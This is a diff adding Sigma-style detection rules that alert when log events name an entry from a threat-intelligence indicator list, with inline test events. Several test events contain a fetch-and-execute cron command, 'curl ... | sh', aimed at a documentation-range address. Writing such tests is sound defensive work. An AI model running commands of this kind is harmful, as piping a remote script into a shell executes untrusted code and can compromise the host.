@@ -1,0 +1,41 @@
+# Threat intelligence: events that name an address, a domain or a file hash of the indicator list
+# (--indicators). Without a list no event has the field "indicator", and these rules stay quiet.
+title: Event names a known bad indicator
+name: intel_indicator_event
+id: 6f3a2c10-0501-4a6e-9d7b-0a1b2c3d4e01
+description: One event that names an entry of the indicator list. It is counted by another rule and gives no alert alone.
+level: low
+detection:
+  selection:
+    indicator|exists: true
+  condition: selection
+tests:
+  - name: an event with an indicator matches, in any kind of log
+    events:
+      - {product: zeek, service: conn, src_ip: 10.0.2.30, dst_ip: 203.0.113.80, indicator: 203.0.113.80, indicator_type: ip, indicator_where: dst_ip}
+      - {product: linux, service: cron, command: "curl http://203.0.113.80/u.sh | sh", indicator: 203.0.113.80, indicator_type: ip, indicator_where: command}
+    expect: {alerts: 2}
+  - name: an event without one does not match
+    events: [{product: zeek, service: conn, src_ip: 10.0.2.30, dst_ip: 198.51.100.200}]
+    expect: {alerts: 0}
+---
+title: Known bad indicator seen
+name: intel_indicator_seen
+id: 6f3a2c10-0502-4a6e-9d7b-0a1b2c3d4e02
+description: Events name an address, a domain or a file hash of your indicator list. One alert for each indicator and burst, over all kinds of logs. How much it means depends on how good the list is.
+level: high
+tags: [attack.command_and_control]
+correlation:
+  type: event_count
+  rules: [intel_indicator_event]
+  group-by: [indicator]
+  timespan: 1h
+  condition: {gte: 1}
+tests:
+  - name: three events for one indicator are one alert, two indicators are two
+    events:
+      - {src_ip: 10.0.2.30, indicator: 203.0.113.80}
+      - {command: "curl http://203.0.113.80/u.sh", indicator: 203.0.113.80}
+      - {dns_query: cdn.bad.example.test, indicator: bad.example.test}
+      - {src_ip: 10.0.1.10, indicator: 203.0.113.80}
+    expect: {alerts: 2}
